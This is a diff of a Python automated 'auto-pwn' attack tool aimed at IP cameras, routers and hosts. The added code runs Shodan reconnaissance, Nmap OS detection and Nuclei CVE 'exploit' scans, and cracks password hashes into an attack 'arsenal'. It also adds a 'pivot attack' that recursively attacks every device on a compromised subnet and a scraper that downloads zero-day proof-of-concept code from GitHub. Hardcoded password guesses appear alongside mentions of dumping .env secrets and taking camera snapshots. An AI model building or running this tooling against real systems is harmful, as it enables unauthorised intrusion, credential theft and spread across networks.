@@ -86,11 +86,31 @@ def main(target_input, manual_mode=False):
         else:
             log("Skipping validation. Starting rescan...", "INFO")
 
-    # اكتشاف المنافذ تلقائياً
+    # --- PHASE 0: OSINT Intelligence ---
+    if not manual_mode:
+        from engines.osint_engine import OSINTEngine
+        osint = OSINTEngine(ip)
+        osint_results = osint.run_shodan_scan()
+        # Pre-populate known open ports from OSINT
+        if osint_results.get("ports"):
+            log(f"Pre-loading {len(osint_results['ports'])} open ports from OSINT data...", "INFO")
+        if osint_results.get("vulns"):
+            # We'll add this to the loot notes later
+            pass
+
+    # اكتشاف المنافذ تلقائياً (دمج مع OSINT)
     scanner = Scanner()
-    open_ports = scanner.discover_ports(ip)
+    live_open_ports = scanner.discover_ports(ip)
+    
+    # Merge OSINT ports with live discovered ports (deduplicated)
+    osint_ports = osint_results.get("ports", []) if 'osint_results' in locals() else []
+    open_ports = list(set(live_open_ports + osint_ports))
+    
     loot = LootReport(ip)
-    loot.open_ports = list(open_ports)
+    loot.open_ports = open_ports
+    
+    if 'osint_results' in locals() and osint_results.get("vulns"):
+        loot.add_note(f"OSINT CVEs (Shodan): {', '.join(osint_results['vulns'])}")
     
     # قوائم تجميع البيانات من كل البورتات
     all_passwords = ["QwEzxc321!@#", "Asdasd12", "12345", DEFAULT_PASSWORD]
@@ -136,7 +156,18 @@ def main(target_input, manual_mode=False):
         elif device_type == "UNKNOWN":
             log("Device type unknown — camera CVE probes + router creds.", "WARNING")
 
-        # --- CVE Intelligence (cameras + routers) ---
+        # --- Active OS Detection via Nmap ---
+        os_result = scanner.detect_os_with_nmap(ip)
+        os_family = os_result.get("os_family", "UNKNOWN_OS")
+        os_details = os_result.get("os_details", "")
+
+        if os_family != "UNKNOWN_OS":
+            log(f"Operating System Detected: {os_family} ({os_details})", "INFO")
+            # Set device_type to OS if we couldn't identify it as an IoT device
+            if device_type == "UNKNOWN" and os_family in ["WINDOWS", "LINUX", "MACOS", "UNIX"]:
+                device_type = os_family
+
+        # --- CVE Intelligence (cameras + routers + OS) ---
         cve_auth = None
         best_early = loot.best_entry()
         if best_early and best_early.has_credentials:
@@ -349,7 +380,46 @@ def main(target_input, manual_mode=False):
                 cam.discover_channels()
                 cam.take_snapshots()
                 cam.open_in_vlc(use_sub_stream=True)
-            
+
+        # --- OS-targeted CVE Exploitation (WINDOWS/LINUX/MACOS/UNIX) ---
+        if os_family != "UNKNOWN_OS" and device_type in ["WINDOWS", "LINUX", "MACOS", "UNIX"]:
+            log(f"=== OS EXPLOIT PHASE: {os_family} ({os_details}) ===", "PWN")
+            try:
+                import json as _json
+                data_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "data")
+                cve_db_path = os.path.join(data_dir, "latest_cves.json")
+                if os.path.exists(cve_db_path):
+                    with open(cve_db_path, 'r', encoding='utf-8') as f:
+                        all_cves = _json.load(f)
+
+                    # Get CVEs matching the detected OS
+                    os_cves = all_cves.get(os_family, [])
+                    # Also check GENERIC for cross-platform vulns
+                    os_cves += all_cves.get("GENERIC", [])
+
+                    if os_cves:
+                        log(f"Found {len(os_cves)} CVE templates for {os_family}. Running Nuclei targeted scans...", "INFO")
+                        os_hits = 0
+                        for cve_entry in os_cves:
+                            templates = cve_entry.get("nuclei_templates", [])
+                            for tmpl in templates:
+                                finding = scanner.scan_specific_template(target_url, tmpl)
+                                if finding:
+                                    os_hits += 1
+                                    tid = finding.get("template-id", tmpl) if isinstance(finding, dict) else str(finding)
+                                    loot.add_note(f"OS CVE HIT ({os_family}): {tid} — {cve_entry.get('title','')}")
+                                    log(f"OS EXPLOIT SUCCESS: {tid}", "PWN")
+                        if os_hits > 0:
+                            log(f"Total OS vulnerabilities confirmed: {os_hits}", "PWN")
+                        else:
+                            log(f"No confirmed OS vulnerabilities on {ip}.", "INFO")
+                    else:
+                        log(f"No CVE templates found for OS: {os_family}.", "INFO")
+                else:
+                    log("Dynamic CVE database not found. Run cve_updater.py first.", "WARNING")
+            except Exception as e:
+                log(f"OS CVE exploitation error: {e}", "ERROR")
+
         # --- DEEP SCAN: cameras → Ingram | routers → RouterSploit ---
         run_rsf = (
             not router_pwned
@@ -395,6 +465,22 @@ def main(target_input, manual_mode=False):
                 loot.add(router_entry)
                 save_success(ip, f"Web ({port})", f"{router_entry.username}:{router_entry.password}")
                 router_pwned = True
+
+        # --- Auto-Decryptor Phase (Hash Cracking) ---
+        # If we found any hashes in the loot (we can check notes or extra dicts), we pass them to John
+        # For this implementation, we will look for specific files or notes that indicate hashes
+        hash_file_path = f"targets/{ip}/hashes.txt"
+        if os.path.exists(hash_file_path):
+            log(f"Found hash file at {hash_file_path}. Starting Auto-Decryptor...", "INFO")
+            from engines.hash_cracker import HashCracker
+            cracker = HashCracker(ip)
+            cracked = cracker.crack_hashes(hash_file_path)
+            if cracked:
+                for pw in cracked:
+                    if pw not in all_passwords:
+                        all_passwords.insert(0, pw)
+                        loot.add_note(f"Auto-Decryptor cracked password: {pw}")
+                        log(f"Cracked Password Added to Arsenal: {pw}", "PWN")
 
         # --- CVE-targeted Nuclei (always in auto mode) ---
         if not manual_mode and device_intel.assessments:
@@ -464,6 +550,51 @@ def main(target_input, manual_mode=False):
         loot.add_note("Laravel .env secrets dumped")
 
     loot.print_final()
+    
+    # === PIVOT ATTACK PHASE (Lateral Movement) ===
+    # Check if we should offer pivot (only if not manual mode and some credentials or exploit succeeded)
+    if not manual_mode and (router_pwned or camera_handled or any(e.has_credentials for e in loot.entries)):
+        print("\n" + "="*50)
+        print("   PIVOT ATTACK (LATERAL MOVEMENT) AVAILABLE")
+        print("="*50)
+        log(f"Device {ip} successfully compromised. You can now use it as a pivot point to attack other devices on its network ({ip}/24).", "WARNING")
+        
+        choice = input("\n[?] Do you want to discover and attack other devices on this subnet? (y/n): ").strip().lower()
+        if choice == 'y':
+            from engines.pivot_scanner import PivotScanner
+            pivot = PivotScanner(ip)
+            devices = pivot.discover_subnet_devices()
+            devices = pivot.classify_devices()
+            
+            if devices:
+                print("\n" + "-"*45)
+                print(f"  DEVICES DISCOVERED ON {pivot.subnet}")
+                print("-" * 45)
+                for i, dev in enumerate(devices):
+                     print(f"  [{i+1}] IP: {dev['ip']:<15} | MAC: {dev.get('mac','N/A'):<17} | Type: {dev['type']:<15} | Vendor: {dev.get('vendor','')}")
+                print("  [A] Attack ALL Devices")
+                print("  [Q] Quit / Don't Pivot")
+                print("-" * 45)
+                
+                pivot_choice = input("\n[?] Select Device ID to attack, 'A' for All, or 'Q' to quit: ").strip().upper()
+                
+                targets_to_pwn = []
+                if pivot_choice == 'A':
+                    targets_to_pwn = [d['ip'] for d in devices if d['ip'] != ip] # exclude current target
+                elif pivot_choice.isdigit():
+                    idx = int(pivot_choice) - 1
+                    if 0 <= idx < len(devices):
+                        target_ip = devices[idx]['ip']
+                        if target_ip != ip:
+                            targets_to_pwn = [target_ip]
+                        else:
+                            log("You selected the device you just hacked. Skipping.", "WARNING")
+                
+                for pivot_ip in targets_to_pwn:
+                    log(f"\n>>> INITIATING PIVOT ATTACK ON {pivot_ip} <<<", "PWN")
+                    # Recursive call!
+                    main(f"http://{pivot_ip}", manual_mode=False)
+
     log("--- ALL TASKS COMPLETED ---", "SUCCESS")
     if open_ports and not manual_mode:
         try:
@@ -484,51 +615,118 @@ if __name__ == "__main__":
     print("==================================================\n")
     
     while True:
-        print("  [1] Enter Target URL manually")
-        print("  [2] Scan Local Network (LAN) to find targets")
-        start_choice = input("\n[?] Select option: ").strip()
-        
         target = ""
-        if start_choice == '1':
-            target = input("[?] Enter Target URL: ").strip()
-            if target: break
-        elif start_choice == '2':
-            scanner = LANScanner()
-            devices = scanner.run_scan()
-            if devices:
+        while True:
+            print("\n  [1] Enter Target URL manually")
+            print("  [2] Scan Local Network (LAN) to find targets")
+            print("  [3] Show Previous Targets (History)")
+            print("  [4] Update Exploit Arsenal (GitHub Zero-Day Scraper)")
+            print("  [0] Exit")
+            start_choice = input("\n[?] Select option: ").strip()
+            
+            if start_choice == '0':
+                print("Exiting...")
+                sys.exit(0)
+            elif start_choice == '1':
+                target = input("[?] Enter Target URL: ").strip()
+                if target: break
+            elif start_choice == '2':
+                scanner = LANScanner()
+                devices = scanner.run_scan()
+                if devices:
+                    print("\n" + "="*60)
+                    print("      SELECT DEVICE TO START AUTO-PWN")
+                    print("="*60)
+                    for i, dev in enumerate(devices):
+                        print(f"  [{i+1}] IP: {dev['ip']:<15} | Type: {dev['type']:<15}")
+                    print("="*60)
+                    
+                    while True:
+                        idx = input("\n[?] Select Device ID (or 'b' to go back): ").strip()
+                        if idx.lower() == 'b': break
+                        try:
+                            target = "http://" + devices[int(idx)-1]['ip']
+                            break
+                        except:
+                            log("Invalid ID. Please try again.", "ERROR")
+                    if target: break
+                else:
+                    log("No devices found on LAN. Try manual entry.", "ERROR")
+            elif start_choice == '3':
+                db_dir = "db"
+                if not os.path.exists(db_dir):
+                    log("No previous targets found.", "ERROR")
+                    continue
+                
+                history_files = [f for f in os.listdir(db_dir) if f.endswith('.json')]
+                if not history_files:
+                    log("No previous targets found.", "ERROR")
+                    continue
+                
                 print("\n" + "="*60)
-                print("      SELECT DEVICE TO START AUTO-PWN")
+                print("      PREVIOUS TARGETS HISTORY")
                 print("="*60)
-                for i, dev in enumerate(devices):
-                    print(f"  [{i+1}] IP: {dev['ip']:<15} | Type: {dev['type']:<15}")
+                
+                targets_list = []
+                for i, file_name in enumerate(history_files):
+                    try:
+                        with open(os.path.join(db_dir, file_name), 'r', encoding='utf-8') as f:
+                            data = json.load(f)
+                            ip = data.get('ip', file_name.replace('.json', ''))
+                            status = data.get('status', 'UNKNOWN')
+                            targets_list.append(ip)
+                            print(f"  [{i+1}] IP: {ip:<15} | Status: {status:<10}")
+                    except:
+                        pass
                 print("="*60)
                 
                 while True:
-                    idx = input("\n[?] Select Device ID (or 'b' to go back): ").strip()
+                    idx = input("\n[?] Select Target ID to resume (or 'b' to go back): ").strip()
                     if idx.lower() == 'b': break
                     try:
-                        target = "http://" + devices[int(idx)-1]['ip']
+                        target = "http://" + targets_list[int(idx)-1]
                         break
                     except:
                         log("Invalid ID. Please try again.", "ERROR")
                 if target: break
+            elif start_choice == '4':
+                log("Launching GitHub Zero-Day PoC Scraper...", "INFO")
+                from engines.zero_day_scraper import ZeroDayScraper
+                scraper = ZeroDayScraper()
+                found = scraper.search_and_download()
+                if found:
+                    log(f"Scraper finished. {len(found)} repositories found/updated.", "SUCCESS")
+                else:
+                    log("Scraper finished. No new PoCs found.", "INFO")
+                input("\nPress Enter to return to the main menu...")
+                continue
             else:
-                log("No devices found on LAN. Try manual entry.", "ERROR")
-        else:
-            log("Invalid option. Please choose 1 or 2.", "ERROR")
-    
-    if target:
-        while True:
-            print("\n[M] Select Execution Mode:")
-            print("    [1] FULL AUTO-PWN (Everything automatically)")
-            print("    [2] EXPERT MANUAL (Choose tools manually)")
-            mode = input("\n[?] Select mode [1/2]: ").strip()
-            
-            if mode in ['1', '2']:
-                is_manual = (mode == '2')
-                break
-            else:
-                log("Invalid mode. Please choose 1 or 2.", "ERROR")
+                log("Invalid option. Please choose 1, 2, 3, 4, or 0.", "ERROR")
         
-        if not target.startswith("http"): target = "http://" + target
-        main(target, manual_mode=is_manual)
+        if target:
+            while True:
+                print("\n[M] Select Execution Mode:")
+                print("    [1] FULL AUTO-PWN (Everything automatically)")
+                print("    [2] EXPERT MANUAL (Choose tools manually)")
+                print("    [0] Back to Main Menu")
+                mode = input("\n[?] Select mode [1/2/0]: ").strip()
+                
+                if mode == '0':
+                    target = "" # Clear target to go back
+                    break
+                elif mode in ['1', '2']:
+                    is_manual = (mode == '2')
+                    break
+                else:
+                    log("Invalid mode. Please choose 1, 2, or 0.", "ERROR")
+            
+            if target:
+                if not target.startswith("http"): target = "http://" + target
+                try:
+                    main(target, manual_mode=is_manual)
+                except KeyboardInterrupt:
+                    log("\nExecution interrupted by user. Returning to main menu...", "WARNING")
+                except Exception as e:
+                    log(f"\nAn error occurred during execution: {e}", "ERROR")
+                
+                input("\nPress Enter to return to the main menu...")
